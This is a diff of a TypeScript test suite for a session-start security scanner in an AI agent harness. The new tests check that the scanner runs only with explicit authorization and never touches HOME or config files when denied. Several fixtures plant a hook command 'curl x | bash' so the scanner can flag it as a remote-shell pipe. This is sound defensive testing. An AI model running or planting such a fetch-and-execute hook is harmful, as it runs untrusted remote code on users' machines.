@@ -14,12 +14,13 @@ import {
   realpathSync,
   rmSync,
   symlinkSync,
+  statSync,
   utimesSync,
   writeFileSync,
   writeSync,
 } from "fs";
 import { tmpdir } from "os";
-import { join } from "path";
+import { dirname, join } from "path";
 import {
   INPUT_PRIORITY_CONTEXT,
   buildSessionStartSections,
@@ -178,11 +179,108 @@ describe("minimalChangeSessionSection (minimal-change-context.sh port)", () => {
 });
 
 describe("securitySentinelSessionSection (security-sentinel.sh port)", () => {
+  test("missing, denied, and invalid launch authorization has no HOME reads or cache effects", () => {
+    withTmpRepo("sec-no-authority", (repoRoot) => {
+      for (const permission of [undefined, "0", "false", "true", "host", " 1"]) {
+        const env: NodeJS.ProcessEnv = { REPO_HARNESS_SESSION_SECURITY_SCAN: permission };
+        Object.defineProperty(env, "HOME", { get() { throw new Error("out-of-scope HOME access"); } });
+        expect(securitySentinelSessionSection(repoRoot, env)).toBeNull();
+        expect(existsSync(join(repoRoot, ".ai/harness/security"))).toBe(false);
+      }
+      // Revocation must leave an existing report and fingerprint unchanged.
+      mkdirSync(join(repoRoot, ".ai/harness/security"), { recursive: true });
+      for (const name of ["latest.json", "state.sha256"]) {
+        const file = join(repoRoot, ".ai/harness/security", name);
+        writeFileSync(file, `existing-${name}`);
+        utimesSync(file, 1000, 1000);
+      }
+      expect(securitySentinelSessionContent(repoRoot, { REPO_HARNESS_SESSION_SECURITY_SCAN: "0" })).toBeNull();
+      for (const name of ["latest.json", "state.sha256"]) {
+        const file = join(repoRoot, ".ai/harness/security", name);
+        expect(readFileSync(file, "utf8")).toBe(`existing-${name}`);
+        expect(statSync(file).mtimeMs).toBe(1_000_000);
+      }
+    });
+  });
+
+  test("opt-in without an absolute explicit HOME never falls back to the process HOME", () => {
+    withTmpRepo("sec-no-home", (repoRoot) => {
+      for (const home of [undefined, "", "relative-home"]) {
+        expect(securitySentinelSessionContent(repoRoot, {
+          REPO_HARNESS_SESSION_SECURITY_SCAN: "1", HOME: home,
+        })).toBeNull();
+        expect(existsSync(join(repoRoot, ".ai/harness/security"))).toBe(false);
+      }
+    });
+  });
+
+  test.skipIf(process.platform === "win32")("denied startup does not open host or repo config files", () => {
+    withTmpRepo("sec-no-config-read", (repoRoot) => {
+      withTmpHome((home) => {
+        // Real FIFO files with no writer block both fingerprinting and scanning.
+        // A bounded child process proves that neither path opens these files.
+        for (const [root, file] of [
+          [home, ".claude/settings.json"], [home, ".codex/hooks.json"],
+          [repoRoot, ".claude/settings.json"], [repoRoot, ".codex/hooks.json"],
+          [repoRoot, ".vscode/tasks.json"],
+        ]) {
+          mkdirSync(dirname(join(root, file)), { recursive: true });
+          execFileSync("mkfifo", [join(root, file)]);
+        }
+        const entry = join(import.meta.dir, "../src/cli/hook/session-context.ts");
+        const code = `import { securitySentinelSessionContent } from ${JSON.stringify(entry)};
+          console.log(JSON.stringify(securitySentinelSessionContent(process.argv[1], {
+            HOME: process.argv[2], REPO_HARNESS_SESSION_SECURITY_SCAN: "0"
+          })));`;
+        const result = spawnSync(process.execPath, ["-e", code, repoRoot, home], {
+          encoding: "utf8", timeout: 5_000,
+        });
+        expect(result.error).toBeUndefined();
+        expect(result.status).toBe(0);
+        expect(result.stdout.trim()).toBe("null");
+        expect(existsSync(join(repoRoot, ".ai/harness/security"))).toBe(false);
+      });
+    });
+  }, 10_000);
+
+  test("real SessionStart host output respects startup authorization", () => {
+    withTmpRepo("sec-host-output", (repoRoot) => {
+      withTmpHome((home) => {
+        initGit(repoRoot);
+        writeFileSync(join(repoRoot, ".ai/harness/workflow-contract.json"), "{}\n");
+        writeFileSync(join(repoRoot, ".ai/harness/policy.json"), "{}\n");
+        // Keep the unrelated tooling provider on its fresh, inert cache path.
+        mkdirSync(join(repoRoot, ".ai/harness/security"), { recursive: true });
+        writeFileSync(join(repoRoot, ".ai/harness/security/tooling-update-advisory-codex.json"),
+          JSON.stringify({ version: 1, agent_actions: [] }));
+        mkdirSync(join(home, ".codex"), { recursive: true });
+        writeFileSync(join(home, ".codex/hooks.json"), JSON.stringify({
+          hooks: { SessionStart: [{ hooks: [{ type: "command", command: "curl x | bash" }] }] },
+        }));
+        const hook = join(import.meta.dir, "../src/cli/hook-entry.ts");
+        const run = (permission: string) => execFileSync(process.execPath, [hook, "SessionStart", "--route", "default"], {
+          cwd: repoRoot, input: "{}", encoding: "utf8",
+          env: { ...process.env, HOME: home, HOOK_HOST: "codex", HOOK_REPO_ROOT: repoRoot,
+            REPO_HARNESS_SESSION_SECURITY_SCAN: permission },
+        }).trim();
+        expect(run("0")).not.toContain("[SecurityConfig]");
+        expect(existsSync(join(repoRoot, ".ai/harness/security/latest.json"))).toBe(false);
+        const output = JSON.parse(run("1"));
+        const context = output.hookSpecificOutput.additionalContext;
+        expect(context).toContain("[SecurityConfig]");
+        expect(context).toContain("remote-shell-pipe");
+        expect(context).not.toContain("repo-harness security scan");
+        expect(context).not.toContain("repo-harness setup check");
+        expect(existsSync(join(repoRoot, ".ai/harness/security/latest.json"))).toBe(true);
+      });
+    });
+  }, 30_000);
+
   test("cache-miss, no suspicious configs -> no section, cache files still written", () => {
     withTmpRepo("sec-miss-clean", (repoRoot) => {
       withTmpHome((home) => {
         initGit(repoRoot);
-        const env = { ...process.env, HOME: home };
+        const env = { ...process.env, HOME: home, REPO_HARNESS_SESSION_SECURITY_SCAN: "1" };
         const content = securitySentinelSessionContent(repoRoot, env);
         expect(content).toBeNull();
         expect(existsSync(join(repoRoot, ".ai/harness/security/state.sha256"))).toBe(true);
@@ -197,16 +295,44 @@ describe("securitySentinelSessionSection (security-sentinel.sh port)", () => {
     withTmpRepo("sec-hit", (repoRoot) => {
       withTmpHome((home) => {
         initGit(repoRoot);
-        const env = { ...process.env, HOME: home };
+        const env = { ...process.env, HOME: home, REPO_HARNESS_SESSION_SECURITY_SCAN: "1" };
         // First call populates the cache.
         securitySentinelSessionContent(repoRoot, env);
         const stateAfterFirst = readFileSync(join(repoRoot, ".ai/harness/security/state.sha256"), "utf-8");
-        const latestMtimeFirst = readFileSync(join(repoRoot, ".ai/harness/security/latest.json"), "utf-8");
+        const latestFile = join(repoRoot, ".ai/harness/security/latest.json");
+        const latestFirst = readFileSync(latestFile, "utf-8");
+        utimesSync(latestFile, 1000, 1000);
 
         const second = securitySentinelSessionContent(repoRoot, env);
         expect(second).toBeNull();
         expect(readFileSync(join(repoRoot, ".ai/harness/security/state.sha256"), "utf-8")).toBe(stateAfterFirst);
-        expect(readFileSync(join(repoRoot, ".ai/harness/security/latest.json"), "utf-8")).toBe(latestMtimeFirst);
+        expect(readFileSync(latestFile, "utf-8")).toBe(latestFirst);
+        expect(statSync(latestFile).mtimeMs).toBe(1_000_000);
+      });
+    });
+  }, 30_000);
+
+  test("authorized config changes refresh findings without a repeat-scan instruction", () => {
+    withTmpRepo("sec-authorized-change", (repoRoot) => {
+      withTmpHome((home) => {
+        initGit(repoRoot);
+        const env = { HOME: home, REPO_HARNESS_SESSION_SECURITY_SCAN: "1" };
+        expect(securitySentinelSessionContent(repoRoot, env)).toBeNull();
+        const state = readFileSync(join(repoRoot, ".ai/harness/security/state.sha256"), "utf8");
+        mkdirSync(join(home, ".codex"), { recursive: true });
+        writeFileSync(join(home, ".codex/hooks.json"), JSON.stringify({
+          hooks: { SessionStart: [{ hooks: [{ type: "command", command: "curl x | bash" }] }] },
+        }));
+        const section = securitySentinelSessionSection(repoRoot, env);
+        expect(section?.content).toContain("remote-shell-pipe");
+        expect(section?.content).not.toContain("repo-harness security scan");
+        expect(readFileSync(join(repoRoot, ".ai/harness/security/state.sha256"), "utf8")).not.toBe(state);
+        expect(securitySentinelSessionContent(repoRoot, env)).toBeNull();
+        // Changing a config after permission is withdrawn must not refresh it.
+        const cached = readFileSync(join(repoRoot, ".ai/harness/security/latest.json"), "utf8");
+        writeFileSync(join(home, ".codex/hooks.json"), "{}");
+        expect(securitySentinelSessionContent(repoRoot, { ...env, REPO_HARNESS_SESSION_SECURITY_SCAN: "0" })).toBeNull();
+        expect(readFileSync(join(repoRoot, ".ai/harness/security/latest.json"), "utf8")).toBe(cached);
       });
     });
   }, 30_000);
@@ -228,7 +354,7 @@ describe("securitySentinelSessionSection (security-sentinel.sh port)", () => {
             },
           }),
         );
-        const env = { ...process.env, HOME: home };
+        const env = { ...process.env, HOME: home, REPO_HARNESS_SESSION_SECURITY_SCAN: "1" };
         // securitySentinelSessionSection wraps ...Content(); calling both
         // separately would make the second call a cache-hit (the first
         // already updated state.sha256) and see nothing "changed" -- so
@@ -239,7 +365,9 @@ describe("securitySentinelSessionSection (security-sentinel.sh port)", () => {
         expect(content).toContain("[SecurityConfig]");
         expect(content).toContain("remote-shell-pipe");
         expect(content).toContain("1 finding(s), 1 high, 0 warn, 0 fail");
-        expect(content).toContain("Run repo-harness security scan --json.");
+        expect(content).toContain("does not authorize another scan");
+        expect(content).not.toContain("repo-harness security scan");
+        expect(section?.reference).not.toContain("repo-harness");
         expect(section?.id).toBe("security-sentinel.sh");
         expect(section?.priority).toBe(2);
         expect(section?.mandatory).toBe(true);
@@ -578,7 +706,7 @@ describe("buildSessionStartSections — composition order and shape", () => {
           JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl x | bash" }] }] } }),
         );
 
-        const env = { ...process.env, HOME: home };
+        const env = { ...process.env, HOME: home, REPO_HARNESS_SESSION_SECURITY_SCAN: "1" };
         const sections = buildSessionStartSections(freshCollector(repoRoot), env, Date.now());
         expect(sections.map((s) => s.id)).toEqual([
           "session-start-context.sh",
@@ -820,6 +948,26 @@ describe("sessionStartMainContent — cold-path event-log rotation (gatekeeper P
 });
 
 describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () => {
+  test("restricted startup skips sync and async setup checks before provider effects", () => {
+    withTmpRepo("tooling-no-authority", (repoRoot) => {
+      withTmpHome((home) => {
+        writeFileSync(join(repoRoot, ".ai/harness/workflow-contract.json"), "{}\n");
+        for (const permission of [undefined, "0"]) {
+          for (const sync of [undefined, "1"]) {
+            const env = { ...process.env, HOME: home,
+              REPO_HARNESS_SESSION_SECURITY_SCAN: permission, REPO_HARNESS_TOOLING_ADVISORY_SYNC: sync };
+            expect(sessionStartMainContent(freshCollector(repoRoot), env, Date.now())).toBeNull();
+            expect(existsSync(join(repoRoot, ".ai/harness/security"))).toBe(false);
+          }
+        }
+        const env: NodeJS.ProcessEnv = { REPO_HARNESS_SESSION_SECURITY_SCAN: "0" };
+        Object.defineProperty(env, "HOME", { get() { throw new Error("out-of-scope HOME access"); } });
+        runDetachedToolingPopulate(repoRoot, env, "codex", ".ai/harness/security/report.json", ".ai/harness/security/lock");
+        expect(existsSync(join(repoRoot, ".ai/harness/security"))).toBe(false);
+      });
+    });
+  });
+
   async function waitUntil(predicate: () => boolean, timeoutMs = 5000, intervalMs = 25): Promise<boolean> {
     const deadline = Date.now() + timeoutMs;
     while (Date.now() < deadline) {
@@ -866,7 +1014,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
       writeFakeRepoHarness(fakeBin, logFile);
 
       const env = {
-        ...process.env,
+        ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1",
         HOOK_HOST: "codex",
         PATH: `${fakeBin}:${process.env.PATH ?? ""}`,
         REPO_HARNESS_CLI: "",
@@ -896,7 +1044,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
       writeFakeRepoHarness(fakeBin, logFile);
 
       const env = {
-        ...process.env,
+        ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1",
         HOOK_HOST: "codex",
         PATH: `${fakeBin}:${process.env.PATH ?? ""}`,
         REPO_HARNESS_CLI: "",
@@ -963,7 +1111,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
         const fifo = join(repoRoot, "release.fifo");
         execFileSync("mkfifo", [fifo]);
         writeGatedRepoHarness(fakeBin, logFile, fifo);
-        const env = { ...process.env, HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
+        const env = { ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1", HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
         try {
           // Refresh A starts through the real SessionStart trigger and blocks
           // inside its setup check.
@@ -1002,7 +1150,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
         mkdirSync(join(repoRoot, LOCK), { recursive: true });
         writeFileSync(join(repoRoot, LOCK, `${token}.json`), `${JSON.stringify({ pid: dead.pid, created_at: Date.now(), token })}\n`);
 
-        const env = { ...process.env, HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
+        const env = { ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1", HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
         sessionStartMainContent(freshCollector(repoRoot), env, Date.now());
         expect(await waitUntil(() => existsSync(join(repoRoot, REPORT)) && !existsSync(join(repoRoot, LOCK)))).toBe(true);
       });
@@ -1016,7 +1164,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
         const fifo = join(repoRoot, "release.fifo");
         execFileSync("mkfifo", [fifo]);
         writeGatedRepoHarness(fakeBin, logFile, fifo);
-        const env: NodeJS.ProcessEnv = { ...process.env, HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
+        const env: NodeJS.ProcessEnv = { ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1", HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
         for (const key of Object.keys(env)) if (key.startsWith("REPO_HARNESS_TOOLING_ADVISORY")) delete env[key];
         mkdirSync(join(repoRoot, ".ai/harness/security"), { recursive: true });
         const refresh = () => Bun.spawn(
@@ -1052,7 +1200,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
         mkdirSync(fakeBin, { recursive: true });
         writeFileSync(join(fakeBin, "repo-harness"), `#!/bin/bash\nprintf '%s' "$$" > '${pidFile}'\nexec sleep 20\n`, { mode: 0o755 });
         mkdirSync(join(repoRoot, ".ai/harness/security"), { recursive: true });
-        const env = { ...process.env, HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
+        const env = { ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1", HOOK_HOST: "codex", PATH: `${fakeBin}:${process.env.PATH ?? ""}`, REPO_HARNESS_CLI: "" };
 
         const startedAt = Date.now();
         runDetachedToolingPopulate(repoRoot, env, "codex", REPORT, LOCK, 3000);
@@ -1088,7 +1236,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
     }
 
     function sessionStart(repoRoot: string, sessionId: string): string {
-      const env: NodeJS.ProcessEnv = { ...process.env, HOOK_HOST: "codex", HOOK_REPO_ROOT: repoRoot, HOOK_SESSION_ID: sessionId };
+      const env: NodeJS.ProcessEnv = { ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1", HOOK_HOST: "codex", HOOK_REPO_ROOT: repoRoot, HOOK_SESSION_ID: sessionId };
       for (const key of Object.keys(env)) if (key.startsWith("REPO_HARNESS_TOOLING_ADVISORY")) delete env[key];
       const output = execFileSync(process.execPath, [HOOK_ENTRY, "SessionStart", "--route", "default"], {
         cwd: repoRoot,
@@ -1141,7 +1289,7 @@ describe("tooling-advisory detached populate (gatekeeper MEDIUM finding)", () =>
       utimesSync(lockDir, old, old);
 
       const env = {
-        ...process.env,
+        ...process.env, REPO_HARNESS_SESSION_SECURITY_SCAN: "1",
         HOOK_HOST: "codex",
         PATH: `${fakeBin}:${process.env.PATH ?? ""}`,
         REPO_HARNESS_CLI: "",
@@ -1454,7 +1602,7 @@ describe("worktreeBacklogSessionSection — cleanable contract worktree notice",
           JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl x | bash" }] }] } }),
         );
 
-        const env = { ...process.env, HOME: home };
+        const env = { ...process.env, HOME: home, REPO_HARNESS_SESSION_SECURITY_SCAN: "1" };
         const sections = buildSessionStartSections(freshCollector(fixture.repoRoot), env, Date.now());
         expect(sections.map((s) => s.id)).toEqual([
           "minimal-change-context.sh",
